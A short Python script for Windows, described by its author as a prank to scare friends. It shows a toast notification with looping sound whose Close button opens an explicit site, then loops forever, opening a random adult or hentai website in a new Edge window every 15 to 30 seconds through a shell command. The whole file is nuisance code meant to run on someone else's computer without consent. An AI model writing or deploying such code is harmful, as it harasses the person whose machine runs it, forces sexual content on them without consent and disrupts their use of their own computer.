"""This is magic that I made to scare my friends ;)"""

from time import sleep
from random import choice, randint
from subprocess import Popen
from winotify import Notification, audio

n = Notification(app_id="forfriend.exe",
                 title="Thank you!",
                 msg="Hehehe 😋",
                 duration="long")


n.add_actions(label='Close', launch='https://nhentai.net/g/454696/18/')
n.set_audio(audio.LoopingCall, loop=True)

popups = ['https://www.nutaku.net/home/','https://www.nutaku.net/games/project-qt/', 'https://www.nutaku.net/games/lusty-odyssey/', 'https://www.nutaku.com/', 'https://nhentai.net/g/454696/18/', 'https://www.nutaku.com/games/camgirls-inc-online/', 'https://nhentai.net/g/454699/1/']

n.show()

while True:
    sleep(randint(15, 30))
    selectedone = choice(popups)
    command = f"cmd /c start msedge {selectedone} --new-window"
    sleep(0.3)
    Popen(command, shell=True)
